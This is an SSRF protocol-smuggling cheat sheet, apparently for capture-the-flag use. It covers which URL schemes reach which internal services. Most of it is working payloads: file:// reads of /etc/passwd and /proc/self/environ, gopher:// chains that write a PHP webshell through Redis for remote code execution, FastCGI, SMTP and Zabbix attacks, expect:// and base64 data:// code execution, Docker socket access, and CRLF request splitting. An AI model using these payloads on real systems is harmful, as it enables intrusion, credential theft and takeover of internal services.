# Protocol smuggling — non-HTTP schemes and what they reach

The fetcher's scheme-list is the real attack surface. `curl`-backed
fetchers take gopher/dict/ftp/ldap/imap; a `requests`-backed one
takes only http(s). Each scheme reaches a different internal world.

---

## 1. The scheme-capability table

| Scheme | Client | Reaches | Shape |
|---|---|---|---|
| `file://` | php/curl/java-netdoc/py-urllib | local FS | read primitive |
| `gopher://` | curl/libcurl | raw TCP | any line-protocol |
| `dict://` | curl | text-protocols | redis/memcached |
| `ftp://` | curl | ftp | limited |
| `ldap://` | curl/java | ldap dirs | AD-ldap reads |
| `tftp://` | curl | tftp | udp-fetch |
| `sftp://`/`scp://` | curl+ssh | ssh-fs | needs creds |
| `telnet://` | curl | raw-ish | interactive |
| `imap://`/`pop3://`/`smtp://` | curl | mail | protocol-driven |
| `jar://` | java | jar-contents | archive-read |
| `netdoc://` | java | files | file://-alias |
| `php://` | php | php-streams | filter-chains! |
| `expect://` | php | exec | RCE-direct |
| `data://` | curl/php | inline | fixed-content |
| `ogg://`/`tlv://`/`rtsp://`/`rtmp://` | curl | streaming | niche |
| `http+unix://` | docker-clients | unix-sockets | docker-api! |
| `ws://`/`wss://` | node-fetchers | websockets | internal ws |

## 2. `file://` — the read primitive

```text
file:///etc/passwd
file:///flag
file:///app/config.py
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/maps
file:///proc/net/tcp                    — listening-socket list!
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd               — windows-smb path
file://attacker.com/share/x               — SMB — windows-only!
file:////attacker.com/share/x              — UNC-form
file:///C:/flag.txt                        — windows
file:///C:\\inetpub\\wwwroot\\web.config
file:///windows/win.ini
file:///boot.ini
```

`file://` read is the canonical first-escalation — flag-paths:
`/flag`, `/flag.txt`, `/app/flag`, `/proc/self/environ` (env-vars!),
`/app/config.*`, `/app/.env`.

## 3. `gopher://` — raw TCP through a URL

The most powerful scheme — the URL's PATH becomes the raw TCP
payload. `gopher://host:port/_<payload>` — the `_` is a placeholder
type-char — everything after is sent verbatim.

```text
gopher://127.0.0.1:6379/_PING                     → +PONG
gopher://127.0.0.1:6379/_INFO                     → info-dump
gopher://127.0.0.1:6379/_CONFIG%20GET%20*          → config
gopher://127.0.0.1:6379/_SET%20x%20y               → write!
gopher://127.0.0.1:6379/_EVAL%20"return%20redis.call('get','flag')"%200
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A
   — the RESP-encoded form — CRLF as %0d%0a
```

The encoding rules: `_` first, then the payload with `%0d%0a` for
CRLF, `%20` for spaces (or literal-space where allowed), `%25` for
literal `%`, `%00` where useful. `gopher_gen` computes the RESP
lengths — hand-counted `$`-lengths are the classic off-by-one bug.

```bash
python3 tools/web/gopher_gen.py redis --cmd "EVAL 'return 1' 0"
python3 tools/web/gopher_gen.py resp --args "EVAL,return redis.call('get','flag'),0"
python3 tools/web/gopher_gen.py raw --text 'PING\r\n'
python3 tools/web/gopher_gen.py http --host internal --path /admin
```

## 4. gopher→redis — the classic chain (the red-island card)

```text
1. gopher://127.0.0.1:6379/_PING → +PONG → redis is there
2. _CONFIG GET dir/dir               → workdir
3. _CONFIG SET dir /var/www/html/     → webroot-write path
4. _CONFIG SET dbfilename x.php
5. _SET payload "<?php system($_GET[c]);?>"
6. _SAVE                              → written to webroot!
   → GET /x.php?c=id — RCE via redis-persistence-to-webroot

alternative — no webroot:
   _EVAL "return redis.call('get','flag')" 0
   → the flag-KEY direct — if the flag lives in redis
   _KEYS * → inventory first
   _GET flag → read
   _LRANGE x 0 -1 → lists
   _HGETALL h → hashes

lua-RCE (redis <5-ish, sandboxed lua):
   _EVAL "return redis.call('set','x','y')" 0
   the red-island chain used lua inside gopher — the $-length
   must be EXACT — that's what gopher_gen resp computes
```

## 5. gopher→memcached

```text
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:11211/_stats%20items
gopher://127.0.0.1:11211/_stats%20cachedump%201%200
gopher://127.0.0.1:11211/_get%20flag
gopher://127.0.0.1:11211/_set%20x%200%200%205%0d%0ahello%0d%0a
   — memcached text-protocol — stats/get/set
```

## 6. gopher→SMTP — send mail from inside

```text
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:%3cx@x%3e%0d%0aRCPT%20TO:%3cy@y%3e%0d%0aDATA%0d%0aSubject:%20x%0d%0a%0d%0abody%0d%0a.%0d%0aQUIT
   — the full SMTP dialogue in one URL — internal-relay mail
   — admin-notification spoof / internal-phish / trigger-emails
```

## 7. gopher→FastCGI — PHP-FPM on port 9000

```text
The FCGI record-protocol is BINARY — gopher sends bytes — the
payload is the FCGI_BEGIN_REQUEST + PARAMS records encoded %XX:
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00
   ... + PARAMS with SCRIPT_FILENAME + the php-file to run
   → known chain: php-fpm FastCGI via gopher → RCE when the
     fcgi-port is reachable + auto_prepend trick
Full FCGI payloads are long — see `fastcgi-gopher.md` for the
record layouts and the auto_prepend_file=shebang trick.
```

## 8. gopher→Zabbix/MySQL — line-protocol reach

```text
gopher://127.0.0.1:10050/_system.uname               — zabbix-agent!
gopher://127.0.0.1:3306/_...                          — mysql binary —
                                                       greeting-read
                                                       only — the
                                                       server-banner
                                                       leaks in the
                                                       response
```

Zabbix-agent (`system.run` item enabled) → `system.run[id]` → RCE —
the agent reads the first line → one-shot payload.

## 9. `dict://` — the simpler line-protocol

```text
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG%20GET%20*
dict://127.0.0.1:6379/SET%20x%20y
dict://127.0.0.1:6379/GET%20flag
dict://127.0.0.1:6379/KEYS%20*
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20flag
dict://127.0.0.1:11211/stats%20items
```

`dict://` sends `<cmd> <args>` per line — simpler than RESP gopher
but limited to text-protocols — redis/memcached work; binary ones
don't. The fetcher response-parses as dict-protocol — the raw text
still leaks through.

## 10. `ldap://` — directory reads

```text
ldap://127.0.0.1/dc=x,dc=y                     — base-dn enum
ldap://127.0.0.1/                              — rootDSE
ldap://127.0.0.1/cn=admin,dc=x,dc=y?attrs
ldap://internal/ou=users,dc=corp,dc=local
```

AD-internal LDAP — anonymous-read sometimes on — user/group/
SPN enumeration → kerberoast-adjacent intel.

## 11. `jar://`/`netdoc://` — java-side

```text
jar:http://internal/x.jar!/x.txt        — read file inside a jar
jar:file:///app.jar!/flag.txt           — local jar-read
jar:file:///tmp/x.jar!/x                — staged-jar
netdoc:///etc/passwd                    — netdoc = file-scheme alias
netdoc:///flag
```

`netdoc://` = `file://` in java-land — `jar://` reads inside
archives — the `!/` separator — traversal inside the archive.

## 12. `php://` — when the fetcher is PHP

```text
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=/flag
php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
php://filter/zlib.deflate|convert.base64-encode/resource=/flag
php://input                              — the request-BODY as file
php://stdin
php://fd/3
expect://id                              — expect-ext — direct RCE!
expect://cat%20/flag
data://text/plain,hi
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
   — data:// + include() → code-exec — needs allow_url_include
```

`php://filter` chains — the whole filter-grammar — LFI-adjacent —
see `web-lfi`'s php-filter references for the full chain-catalog.

## 13. `http+unix://` — the docker socket

```text
http+unix://%2Fvar%2Frun%2Fdocker.sock/containers/json
http+unix://%2Fvar%2Frun%2Fdocker.sock/info
http+unix://%2Fvar%2Frun%2Fdocker.sock/images/json
   — if the fetcher supports curl's --unix-socket variant or a
     docker-client lib → the docker API → container-control!
```

## 14. The cross-protocol HTTP — HTTP on a non-HTTP port

```text
http://127.0.0.1:6379/                  — HTTP-request to redis —
                                          redis tolerates unknown-
                                          command lines → INFO etc
                                          can smuggle via headers!
http://127.0.0.1:6379/%0d%0aCONFIG%20GET%20*   — CRLF-in-path
http://127.0.0.1:11211/                   — memcached — same tolerance
http://127.0.0.1:6379/x HTTP/1.1 headers with the KEY inside them —
   redis sees "GET / HTTP/1.1" (err), "Host: x" (err), but the
   COMMAND-LINE the url encodes runs!
```

An HTTP request to a line-protocol port: the request-LINE + each
HEADER is a command-line — `url=http://redis/INFO%20x` sends
`GET /INFO%20x HTTP/1.1` — redis tries `GET` → error, but
`url=http://redis/%0d%0aCONFIG%20GET%20*%0d%0a` — CRLF in the path
→ newlines split the request into multiple command-lines → real
commands run. The weather-app chain is this family — it's the
SSRF↔request-smuggling boundary.

## 15. The CRLF-injection boundary — when it stops being SSRF

```text
url=http://internal/x%0d%0aHeader:%20v%0d%0a%0d%0aGET%20/flag
   — %0d%0a decoded by the URL-parser → raw CRLF in the request →
     the outbound request splits → request-injection/smuggling —
     different class, stronger primitive — web-request-smuggling
```

When control-chars survive to the wire, you're not fetching —
you're composing requests. The whole request becomes yours —
headers, body, even a second pipelined request.
